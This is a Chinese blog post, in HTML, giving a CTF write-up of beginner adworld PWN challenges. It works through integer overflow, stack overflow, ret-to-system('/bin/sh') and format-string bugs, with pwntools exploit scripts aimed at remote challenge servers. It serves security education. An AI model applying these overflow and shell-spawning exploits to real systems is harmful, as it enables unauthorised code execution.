@@ -1,0 +1,1198 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="前言整理adworld的PWN题新手练习区WriteUp；">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ADWORLD PWN 新手练习区 WP">
+<meta property="og:url" content="https://leeyuxun.github.io/ADWORLD-PWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA-WP.html">
+<meta property="og:site_name" content="Leeyuxun の note">
+<meta property="og:description" content="前言整理adworld的PWN题新手练习区WriteUp；">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105150511.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105151002.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105151826.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105151905.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105152246.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105154215.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105155028.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210111173119.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210111173223.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210111173331.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210111173934.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112182836.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112182915.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112182955.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112183058.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112190639.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112190737.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112191546.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210113175210.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210113175253.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210113175639.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127181940.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127182146.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127183343.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127183550.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127184609.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127185953.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309171152.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309171527.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309172717.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309192516.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309192857.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309192932.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309193014.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309194552.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309201701.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310204654.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310204901.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310205105.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310205604.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310210511.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310213428.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310213606.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310213628.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310215656.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311141158.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311143141.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311143555.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311144812.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311145853.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311150325.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311103929.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311104117.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311110109.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311110429.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311110507.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311110630.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311111007.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311111737.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311112417.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311113012.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311135444.png">
+<meta property="article:published_time" content="2021-03-11T07:05:53.000Z">
+<meta property="article:modified_time" content="2021-03-11T07:12:22.000Z">
+<meta property="article:author" content="李钰璕">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105150511.png">
+
+<link rel="canonical" href="https://leeyuxun.github.io/ADWORLD-PWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA-WP.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ADWORLD PWN 新手练习区 WP | Leeyuxun の note</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163555158-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leeyuxun の note</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://leeyuxun.github.io/ADWORLD-PWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA-WP.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="李钰璕">
+      <meta itemprop="description" content="安全学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leeyuxun の note">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ADWORLD PWN 新手练习区 WP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-11 15:05:53 / 修改时间：15:12:22" itemprop="dateCreated datePublished" datetime="2021-03-11T15:05:53+08:00">2021-03-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整理adworld的PWN题新手练习区WriteUp；<span id="more"></span></p>
+<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p>整数溢出！</p>
+<ol>
+<li><p>checksec查看，开启RELOR和NX；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105150511.png" style="zoom:50%;"></li>
+<li><p>放入IDA中分析；</p>
+<ol>
+<li><p>main()函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105151002.png" style="zoom:50%;"></li>
+<li><p>login()函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105151826.png" style="zoom:50%;"></li>
+<li><p>check_passwd()函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105151905.png" style="zoom:50%;"></li>
+<li><p>what_is_this()函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105152246.png" style="zoom:50%;">
+
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105154215.png" style="zoom:50%;"></li>
+<li><p>分析：</p>
+<p> main()选择是否登录，login()输入username和passwd，check_passwd()判断密码，注入点在check_passwd()中，分析如下：</p>
+<ol>
+<li> v3为密码长度，要求<code>3&lt;v3&lt;=8</code></li>
+<li> 将密码s复制给dest，其中s的不超过<code>0x199</code>字节，dest距离ebp有<code>0x14</code>字节；</li>
+<li> v3位 unsigned_int8类型，最大只能255，passwd长度在259-263之间即可绕过；</li>
+<li> 可以通过覆盖v3、dest、ebp实现执行what_is_this()函数；</li>
+</ol>
+</li>
+<li><p>构造payload如下；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>)</span><br><span class="line">p = remote(<span class="string">"220.249.52.134"</span>,<span class="string">"54323"</span>)</span><br><span class="line"><span class="comment"># p = process('./int_overflow')</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'username:'</span>,<span class="string">'leeyuxun'</span>)</span><br><span class="line">what_is_this = p32(<span class="number">0x804868B</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + what_is_this</span><br><span class="line">payload = payload.ljust(<span class="number">259</span>,<span class="string">"a"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'passwd:'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>执行payload，溢出成功，拿到flag如下；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105155028.png" style="zoom:50%;"></li>
+</ol>
+</li>
+</ol>
+<h2 id="Hello-pwn"><a href="#Hello-pwn" class="headerlink" title="Hello_pwn"></a>Hello_pwn</h2><p>栈溢出</p>
+<ol>
+<li><p>checksec查看，开启RELOR和NX；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210111173119.png" style="zoom:50%;"></li>
+<li><p>放入IDA中分析；</p>
+<ol>
+<li><p>main()函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210111173223.png" style="zoom:50%;"></li>
+<li><p>sub_400686()函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210111173331.png" style="zoom:50%;"></li>
+<li><p>分析：</p>
+<ol>
+<li> 读取16字节输入到unk_601068；</li>
+<li> 判断dword_60106C是否等于1853186401；</li>
+<li> 如果等于就执行sub_400686()函数；</li>
+<li> unk_601068与dword_60106C相差4字节；</li>
+<li> 只需将dword_60106C起填充为1853186401即可；</li>
+</ol>
+</li>
+<li><p>构造payload如下</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"220.249.52.134"</span>,<span class="string">"40723"</span>)</span><br><span class="line"><span class="comment"># p = process('./hello_pwn')</span></span><br><span class="line">dword_60106C = p64(<span class="number">1853186401</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> + dword_60106C</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>执行payload，溢出成功，拿到flag如下；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210111173934.png" style="zoom:50%;"></li>
+</ol>
+</li>
+</ol>
+<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p>修改system函数参数的栈溢出！</p>
+<ol>
+<li><p>checksec查看，开启RELOR和NX；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112182836.png" style="zoom:50%;"></li>
+<li><p>放入IDA中分析；</p>
+<ol>
+<li><p>main()函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112182915.png" style="zoom:50%;"></li>
+<li><p>hello()函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112182955.png" style="zoom:50%;"></li>
+<li><p>pwn()函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112183058.png" style="zoom:50%;"></li>
+</ol>
+</li>
+<li><p>分析</p>
+<ol>
+<li><p> main()定义三个流的缓冲区，然后调用hello()；</p>
+</li>
+<li><p> hello()前部分可以不看，后三行，首先通过fgets()输入name，其次输入message，这里gets()函数存在缓冲区溢出漏洞；</p>
+</li>
+<li><p> pwn()函数调用了system，但是并未出现<code>/bin/sh</code>或者是<code>cat flag</code>；</p>
+</li>
+<li><p>查看发现name是bss段的一个大小为<code>0x34</code>的区域，s区域的起始位置是运行时距离栈帧<code>0x26</code>个字节的地方，大小不限；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112190639.png" style="zoom:50%;">
+
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112190737.png" style="zoom:50%;"></li>
+<li><p> 由于只开启了NX，那么name的地址是不变的，记下name地址<code>0x0808A0880</code>，输入<code>/bin/sh</code>到name里；</p>
+</li>
+<li><p> 把name作为参数传给system，构成<code>system("/bin/sh")</code></p>
+</li>
+</ol>
+</li>
+<li><p>payload如下</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name_dir = p32(<span class="number">0x0804A080</span>)</span><br><span class="line">syst_dir = p32(<span class="number">0x08048420</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x26</span> + <span class="string">'A'</span>*<span class="number">0x4</span> + syst_dir + <span class="string">'a'</span>*<span class="number">0x4</span> + name_dir</span><br></pre></td></tr></table></figure>
+
+<p> s距离ebp有<code>0x26</code>，再加上需要覆盖的ebp长度<code>0x4</code>，所以总共需要填充，在加上system地址，再加上任意4位地址填充和name地址，最终payload如下</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'220.249.52.134'</span>,<span class="string">'58209'</span>)</span><br><span class="line"><span class="comment"># p = process('./cgpwn2')</span></span><br><span class="line">name_dir = p32(<span class="number">0x0804A080</span>)</span><br><span class="line">syst_dir = p32(<span class="number">0x08048420</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x26</span> + <span class="string">'a'</span>*<span class="number">0x4</span> + syst_dir + <span class="string">'a'</span>*<span class="number">0x4</span> + name_dir</span><br><span class="line">p.recvline(<span class="string">'please tell me your name/n'</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.recvline(<span class="string">'hello,you can leave some message here:/n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>执行payload，溢出成功，拿到flag如下；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112191546.png" style="zoom:50%;"></li>
+</ol>
+<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><p>？？？</p>
+<ol>
+<li><p>checksec查看，开启RELOR和NX；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210113175210.png" style="zoom:50%;"></li>
+<li><p>放入IDA中分析；</p>
+<ol>
+<li><p>main()函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210113175253.png" style="zoom:50%;">
+
+<p> ？？？？？被安排滴明明白白！！！</p>
+</li>
+<li><p>直接payload；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'220.249.52.134'</span>,<span class="string">'32274'</span>)</span><br><span class="line"><span class="comment"># p = process('./get_shell')</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>执行查看flag，（不写payload，直接nc连接更快）；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210113175639.png" style="zoom:50%;"></li>
+</ol>
+</li>
+</ol>
+<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>格式化字符串漏洞！</p>
+<ol>
+<li><p>checksec查看，开启RELOR、NX和栈保护；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127181940.png" style="zoom:50%;"></li>
+<li><p>放入IDA中分析；</p>
+<ol>
+<li><p>main()函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127182146.png" style="zoom:50%;"></li>
+</ol>
+</li>
+<li><p>分析</p>
+<ol>
+<li><p> 只需将pwnme的之设为8即可实现<code>cat flag</code>；</p>
+</li>
+<li><p> 程序中没有给pwnme赋值的操作；</p>
+</li>
+<li><p>程序中<code>printf(&amp;s)</code>存在格式化字符串漏洞：</p>
+<ol>
+<li><p>漏洞介绍：</p>
+<ol>
+<li><p> 一般<code>printf()</code>函数格式为<code>printf("格式化字符串",参数...)</code>，参数由格式化说明符与字符串组成的，通过格式化说明符来规定参数用什么格式输出内容；</p>
+</li>
+<li><p>格式化说明符有如下几种：</p>
+<ol>
+<li> <code>%d</code>：输出十进制整数 </li>
+<li> <code>%s</code>：从内存中输出字符串 </li>
+<li> <code>%x</code>：输出十六进制数 </li>
+<li> <code>%c</code>：输出字符 </li>
+<li> <code>%p</code>：输出指针地址 </li>
